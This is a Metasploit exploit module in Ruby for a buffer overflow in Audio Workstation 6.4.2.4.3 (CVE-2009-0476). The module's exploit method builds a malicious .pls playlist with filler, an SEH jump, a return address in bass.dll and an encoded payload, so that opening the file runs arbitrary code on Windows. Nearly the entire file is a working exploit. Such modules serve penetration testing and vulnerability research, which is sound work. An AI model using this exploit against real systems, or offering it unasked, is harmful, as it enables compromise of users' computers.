##
# $Id: audio_wkstn_pls.rb 10477 2010-09-25 11:59:02Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'Audio Workstation 6.4.2.4.3 pls Buffer Overflow\',
			\'Description\'    => %q{
					This module exploits a buffer overflow in Audio Workstation 6.4.2.4.3.
				When opening a malicious pls file with the Audio Workstation,
				a remote attacker could overflow a buffer and execute
				arbitrary code.
			},
			\'License\'        => MSF_LICENSE,
			\'Author\'         => [ \'germaya_x\', \'dookie\', ],
			\'Version\'        => \'$Revision: 10477 $\',
			\'References\'     =>
				[
					[ \'CVE\', \'2009-0476\' ],
					[ \'OSVDB\', \'55424\' ],
					[ \'URL\', \'http://www.exploit-db.com/exploits/10353\' ],
				],
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'seh\',
					\'DisablePayloadHandler\' => \'true\',
				},
			\'Payload\'        =>
				{
					\'Space\'    => 4100,
					\'BadChars\' => \"\\x00\",
					\'StackAdjustment\' => -3500,
					\'EncoderType\'   => Msf::Encoder::Type::AlphanumUpper,
					\'DisableNops\'   =>  \'True\',
				},
			\'Platform\' => \'win\',
			\'Targets\'        =>
				[
					[ \'Windows Universal\', { \'Ret\' => 0x1101031E } ], # p/p/r in bass.dll
				],
			\'Privileged\'     => false,
			\'DisclosureDate\' => \'Dec 08 2009\',
			\'DefaultTarget\'  => 0))

		register_options(
			[
				OptString.new(\'FILENAME\', [ true, \'The file name.\',  \'msf.pls\']),
			], self.class)

	end

	def exploit

		sploit = rand_text_alpha_upper(1308)
		sploit << \"\\xeb\\x16\\x90\\x90\"
		sploit << [target.ret].pack(\'V\')
		sploit << make_nops(32)
		sploit << payload.encoded
		sploit << rand_text_alpha_upper(4652 - payload.encoded.length)

		print_status(\"Creating \'#{datastore[\'FILENAME\']}\' file ...\")
		file_create(sploit)

	end

end
